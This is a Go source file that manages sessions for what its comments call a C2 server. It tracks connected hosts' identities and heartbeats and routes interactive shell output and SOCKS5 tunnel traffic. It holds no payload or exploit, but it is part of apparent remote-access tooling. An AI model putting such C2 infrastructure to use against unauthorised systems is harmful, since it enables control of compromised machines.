package session

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"toshell/internal/common/protocol"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/database"
	"toshell/internal/server/logging"
)

type Manager struct {
	sessions map[string]*Session
	mu       sync.RWMutex
}

type Session struct {
	Info               *types.SessionInfo
	Heartbeat          *protocol.Heartbeat
	LastSeen           time.Time
	manager            *Manager
	Conn               interface{}
	connMu             sync.RWMutex
	shellHandlers      map[string]func([]byte)
	shellHandlersMu    sync.RWMutex
	shellCWDHandlers   map[string]func(string)
	shellCWDHandlersMu sync.RWMutex
	shellCWD           string
	shellCWDMu         sync.RWMutex
	tunnelHandler      func(*tunnel.TunnelPacket)
	tunnelHandlerMu    sync.RWMutex
}

type Connection interface {
	WriteMessage(data []byte) error
	Close() error
}

var (
	manager *Manager
	once    sync.Once
)

func New() *Manager {
	once.Do(func() {
		manager = &Manager{
			sessions: make(map[string]*Session),
		}
	})
	return manager
}

func Get() *Manager {
	if manager == nil {
		return New()
	}
	return manager
}

func (m *Manager) Add(info *types.SessionInfo) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if _, exists := m.sessions[info.ID]; exists {
		return fmt.Errorf("session already exists: %s", info.ID)
	}

	session := &Session{
		Info:      info,
		Heartbeat: nil,
		LastSeen:  time.Now(),
		manager:   m,
	}

	m.sessions[info.ID] = session

	db := database.Get()
	if db != nil {
		db.CreateSession(info)
	}

	logging.Info("session", "Session added: %s (%s@%s)", info.ID, info.Username, info.Hostname)
	return nil
}

func (m *Manager) Get(id string) (*Session, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	session, ok := m.sessions[id]
	if !ok {
		return nil, fmt.Errorf("session not found: %s", id)
	}

	return session, nil
}

func (m *Manager) List() []*Session {
	m.mu.RLock()
	defer m.mu.RUnlock()

	list := make([]*Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		list = append(list, s)
	}

	return list
}

// CountByListener 按监听器类型统计会话数（在线 active 与总数）。
// 通道健康仪表板数据源。加锁遍历，避免 handler 直接碰内部锁。
func (m *Manager) CountByListener() map[string]map[string]int {
	m.mu.RLock()
	defer m.mu.RUnlock()

	out := map[string]map[string]int{}
	for _, s := range m.sessions {
		if s == nil || s.Info == nil {
			continue
		}
		typ := s.Info.Listener
		if typ == "" {
			typ = "unknown"
		}
		if out[typ] == nil {
			out[typ] = map[string]int{"total": 0, "online": 0}
		}
		out[typ]["total"]++
		if s.Info.Status == "active" || s.IsAlive() {
			out[typ]["online"]++
		}
	}
	return out
}

func (m *Manager) ListInfo() []*types.SessionInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	// 并发安全：Info 是共享指针，外部 goroutine 可能并发读 Status/LastSeen。
	// 这里返回深拷贝，绝不原地改写共享对象（此前在 RLock 内写 Status 与
	// 心跳/checker 的读产生 data race）。
	list := make([]*types.SessionInfo, 0, len(m.sessions))
	for _, s := range m.sessions {
		if s.Info == nil {
			continue
		}
		cp := *s.Info // 浅拷贝结构体（切片字段共享只读数据，安全）
		cp.IPAddresses = append([]string(nil), s.Info.IPAddresses...)
		cp.MACAddresses = append([]string(nil), s.Info.MACAddresses...)
		cp.ActiveModules = append([]string(nil), s.Info.ActiveModules...)
		// 副本上计算实时状态（不写共享对象）：仅当未被 listener 判死时
		// 依据心跳窗口刷新为 active/dead，供前端展示。
		if s.IsAlive() && cp.Status != "dead" {
			cp.Status = "active"
		} else if !s.IsAlive() && cp.Status != "dead" {
			cp.Status = "asleep"
		}
		list = append(list, &cp)
	}
	return list
}

func (m *Manager) Update(id string, info *types.SessionInfo) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[id]
	if !ok {
		return fmt.Errorf("session not found: %s", id)
	}

	session.Info = info
	session.LastSeen = time.Now()

	db := database.Get()
	if db != nil {
		db.UpdateSession(info)
	}

	return nil
}

// UpdateComment updates the comment of a session both in memory and in the database.
func (m *Manager) UpdateComment(id, comment string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[id]
	if !ok {
		return fmt.Errorf("session not found: %s", id)
	}

	session.Info.Comment = comment

	db := database.Get()
	if db != nil {
		if err := db.UpdateSessionComment(id, comment); err != nil {
			logging.Error("session", "Failed to update session comment for %s: %v", id, err)
			return err
		}
	}

	logging.Debug("session", "Session comment updated: %s", id)
	return nil
}

// RefreshInfo 就地刷新已有会话的注册信息（C2 重连时调用）。
// 关键：必须保留原 Session 对象及其上层状态（tunnelHandler/shellHandlers），
// 仅更新 Info 字段与 LastSeen，否则 Remove+Add 重建会导致隧道 handler 丢失，
// 已建 SOCKS5 代理的上行数据被 DispatchTunnelData 静默丢弃（ERR_SSL_PROTOCOL_ERROR）。
func (m *Manager) RefreshInfo(id string, info *types.SessionInfo) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[id]
	if !ok {
		return fmt.Errorf("session not found: %s", id)
	}

	if session.Info == nil {
		session.Info = info
	}
	cur := session.Info
	cur.Hostname = info.Hostname
	cur.Username = info.Username
	cur.OS = info.OS
	cur.Arch = info.Arch
	cur.PID = info.PID
	cur.ProcessName = info.ProcessName
	cur.ProcessPath = info.ProcessPath
	cur.IPAddresses = info.IPAddresses
	cur.MACAddresses = info.MACAddresses
	cur.Domain = info.Domain
	cur.RemoteAddr = info.RemoteAddr
	cur.LastSeen = info.LastSeen
	cur.Status = "active"
	cur.Listener = info.Listener
	session.LastSeen = info.LastSeen

	db := database.Get()
	if db != nil {
		db.UpdateSession(cur)
	}
	return nil
}

func (m *Manager) UpdateHeartbeat(id string, hb *protocol.Heartbeat) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[id]
	if !ok {
		return fmt.Errorf("session not found: %s", id)
	}

	session.Heartbeat = hb
	session.LastSeen = time.Now()

	session.Info.CPUUsage = hb.CPUUsage
	session.Info.MemoryUsed = hb.MemoryUsed
	session.Info.ActiveModules = hb.Modules

	db := database.Get()
	if db != nil {
		session.Info.LastSeen = time.Now()
		db.UpdateSession(session.Info)
	}

	return nil
}

func (m *Manager) Remove(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if _, ok := m.sessions[id]; !ok {
		return fmt.Errorf("session not found: %s", id)
	}

	delete(m.sessions, id)

	db := database.Get()
	if db != nil {
		db.DeleteSession(id)
	}

	logging.Info("session", "Session removed: %s", id)
	return nil
}

func (m *Manager) SetConnection(id string, conn interface{}) error {
	m.mu.RLock()
	session, ok := m.sessions[id]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", id)
	}

	session.connMu.Lock()
	session.Conn = conn
	session.connMu.Unlock()

	logging.Debug("session", "Connection set for session %s", id)
	return nil
}

func (m *Manager) GetConnection(id string) (interface{}, error) {
	m.mu.RLock()
	session, ok := m.sessions[id]
	m.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("session not found: %s", id)
	}

	session.connMu.RLock()
	defer session.connMu.RUnlock()

	if session.Conn == nil {
		return nil, fmt.Errorf("no connection for session: %s", id)
	}

	return session.Conn, nil
}

func (m *Manager) ClearConnection(id string) {
	m.mu.RLock()
	session, ok := m.sessions[id]
	m.mu.RUnlock()

	if ok {
		session.connMu.Lock()
		session.Conn = nil
		session.connMu.Unlock()
		logging.Debug("session", "Connection cleared for session %s", id)
	}
}

func (m *Manager) GetStatus(id string) (string, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	session, ok := m.sessions[id]
	if !ok {
		return "", fmt.Errorf("session not found: %s", id)
	}

	if time.Since(session.LastSeen) > 90*time.Second {
		return "asleep", nil
	}

	return "active", nil
}

func (m *Manager) Search(query string) []*Session {
	m.mu.RLock()
	defer m.mu.RUnlock()

	results := make([]*Session, 0)

	for _, s := range m.sessions {
		if strings.Contains(s.Info.Hostname, query) ||
			strings.Contains(s.Info.Username, query) ||
			strings.Contains(s.Info.OS, query) ||
			strings.Contains(s.Info.ID, query) {
			results = append(results, s)
		}
	}

	return results
}

func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions)
}

func (m *Manager) GetSessionInfo(id string) (*types.SessionInfo, error) {
	m.mu.RLock()
	session, ok := m.sessions[id]
	m.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("session not found: %s", id)
	}

	return session.Info, nil
}

func (s *Session) GetInfo() *types.SessionInfo {
	return s.Info
}

func (s *Session) IsAlive() bool {
	return time.Since(s.LastSeen) < 90*time.Second
}

func (s *Session) AddShellOutputHandler(id string, handler func([]byte)) {
	s.shellHandlersMu.Lock()
	defer s.shellHandlersMu.Unlock()

	if s.shellHandlers == nil {
		s.shellHandlers = make(map[string]func([]byte))
	}
	s.shellHandlers[id] = handler
}

func (s *Session) RemoveShellOutputHandler(id string) {
	s.shellHandlersMu.Lock()
	defer s.shellHandlersMu.Unlock()

	if s.shellHandlers != nil {
		delete(s.shellHandlers, id)
	}
}

func (s *Session) DispatchShellOutput(data []byte) {
	s.shellHandlersMu.RLock()
	defer s.shellHandlersMu.RUnlock()

	fmt.Printf("[DEBUG] [session] DispatchShellOutput called, handlers count: %d\n", len(s.shellHandlers))
	for id, handler := range s.shellHandlers {
		fmt.Printf("[DEBUG] [session] Calling handler: %s\n", id)
		go handler(data)
	}
}

// SetShellCWD 更新交互式 shell 的当前工作目录；仅在值变化时推送通知。
func (s *Session) SetShellCWD(cwd string) {
	s.shellCWDMu.Lock()
	changed := cwd != "" && cwd != s.shellCWD
	if changed {
		s.shellCWD = cwd
	}
	s.shellCWDMu.Unlock()
	if changed {
		s.DispatchShellCWD(cwd)
	}
}

// GetShellCWD 返回最近一次上报的交互式 shell 工作目录。
func (s *Session) GetShellCWD() string {
	s.shellCWDMu.RLock()
	defer s.shellCWDMu.RUnlock()
	return s.shellCWD
}

func (s *Session) AddShellCWDHandler(id string, handler func(string)) {
	s.shellCWDHandlersMu.Lock()
	defer s.shellCWDHandlersMu.Unlock()

	if s.shellCWDHandlers == nil {
		s.shellCWDHandlers = make(map[string]func(string))
	}
	s.shellCWDHandlers[id] = handler
}

func (s *Session) RemoveShellCWDHandler(id string) {
	s.shellCWDHandlersMu.Lock()
	defer s.shellCWDHandlersMu.Unlock()

	if s.shellCWDHandlers != nil {
		delete(s.shellCWDHandlers, id)
	}
}

func (s *Session) DispatchShellCWD(cwd string) {
	s.shellCWDHandlersMu.RLock()
	defer s.shellCWDHandlersMu.RUnlock()

	for _, handler := range s.shellCWDHandlers {
		go handler(cwd)
	}
}

func (s *Session) SetTunnelHandler(handler func(*tunnel.TunnelPacket)) {
	s.tunnelHandlerMu.Lock()
	defer s.tunnelHandlerMu.Unlock()
	s.tunnelHandler = handler
}

func (s *Session) DispatchTunnelData(packet *tunnel.TunnelPacket) {
	s.tunnelHandlerMu.RLock()
	handler := s.tunnelHandler
	s.tunnelHandlerMu.RUnlock()

	if handler != nil {
		// 同步派发（不在 goroutine 中）：
		// 1. 避免每包一个 goroutine 的开销；
		// 2. 保证同一隧道的帧按 C2 读取顺序交付，下行写入队列+单 writer 再保证写入 ClientConn 有序，
		//    否则并发 goroutine 会让同隧道 TCP 数据乱序 → 流损坏、吞吐骤降。
		// 3. 缩小 readBuf 复用竞态窗口（handleTunnelRaw 已对 Data 深拷贝，此处仍要求同步以稳妥）。
		handler(packet)
	}
}
